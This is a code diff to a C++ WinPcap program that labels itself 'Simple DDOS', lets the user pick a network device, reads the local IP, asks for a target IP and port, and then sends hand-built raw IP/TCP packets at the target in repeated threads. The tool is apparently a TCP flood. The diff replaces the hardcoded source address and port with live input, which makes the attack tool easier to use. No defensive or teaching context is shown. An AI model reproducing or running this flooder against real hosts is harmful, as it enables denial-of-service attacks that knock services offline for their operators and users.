@@ -86,6 +86,8 @@ int main(int args,char* argv[])
 	pcap_if_t *alldevs = getDevs();
 	int i = 0;//len of alldevs
 	/* 打印列表 */
+	std::cout << "\n*********\nSimple DDOS!!!!\n*********\n" << std::endl;
+	std::cout << "\n设备列表：" << std::endl;
 	for (pcap_if_t* d = alldevs; d != NULL; d = d->next)
 	{
 		printf("%d. %s", ++i, d->name);
@@ -113,7 +115,25 @@ int main(int args,char* argv[])
 		else break;
 	}
 	auto *dd = getDev(choose, alldevs);//获取选择的网卡设备
-	std::cout << "您选择的网卡为:\n" <<dd->name << "\n";
+	auto *a = dd->addresses;
+
+	std::cout << "您选择的网卡为:\n" <<dd->description << "\n";
+
+	char * myIp;
+	while(a)
+	{
+		if (a->addr->sa_family == AF_INET)
+		{
+			if (a->addr)
+			{
+				myIp = iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr);
+				printf("\t本机IP地址: %s\n", myIp );
+				
+			}
+			break;
+		}
+		a = a->next;
+	}
 	
 	
 	//验证IP
@@ -132,13 +152,19 @@ int main(int args,char* argv[])
 	std::cout << "您输入的IP为:\n" << ip << "\n";
 
 	//getMacbyIp(ip);
+	std::cout << "请输入PORT：" << std::endl;
+	int port;
+	std::cin >> port;
+
+	
+	std::cout << "您输入的IP为:\n" << ip << "\n";
 
 	std::cout << "开始攻击\n" << ip << "\n";
 
 	//simpleDD(ip, dd->name);
 	for (int i = 0; i < 10; i++)
 	{
-		std::thread t(simpleDD, ip, dd->name);
+		std::thread t(simpleDD, ip, dd->name, myIp,port );
 		t.join();
 	}
 	
@@ -148,10 +174,10 @@ int main(int args,char* argv[])
 	return 0;
 }
 //攻击func
-void simpleDD(std::string ip,char* devName)
+void simpleDD(std::string ip,char* devName,char* myIp,int port )
 {
-	const char * MYIP = "192.168.31.216";
-	int port = 80;//攻击目标端口
+	//const char * MYIP = "10.2.10.15";//"192.168.31.216";
+	//int port = 8080;//攻击目标端口
 	int SendSEQ = 0;
 	unsigned long FakeIpNet, FakeIpHost;
 
@@ -183,7 +209,7 @@ void simpleDD(std::string ip,char* devName)
 	ipHeader.ttl = 0x80;
 	ipHeader.type = 6;//TCP  
 	ipHeader.cksum = 0;
-	ipHeader.sIP = inet_addr(MYIP);
+	ipHeader.sIP = inet_addr(myIp);
 	ipHeader.dIP = inet_addr(ip.c_str());
 	ipHeader.cksum = checksum((USHORT*)&ipHeader, sizeof(ipHeader));
 	tcpHeader.sPort = htons(1095);
@@ -198,7 +224,7 @@ void simpleDD(std::string ip,char* devName)
 	byte tempdata[12] = { 0x02,0x04,0x05,0xb4,
 		0x01,0x03,0x03,0x02,0x01,0x01,0x04,0x02 };
 	memcpy(tcpHeader.options, tempdata, 12);
-	psdTcp.sAddr = inet_addr(MYIP);
+	psdTcp.sAddr = inet_addr(myIp);
 	psdTcp.dAddr = inet_addr(ip.c_str());
 	psdTcp.type = 6;
 	psdTcp.x = 0;
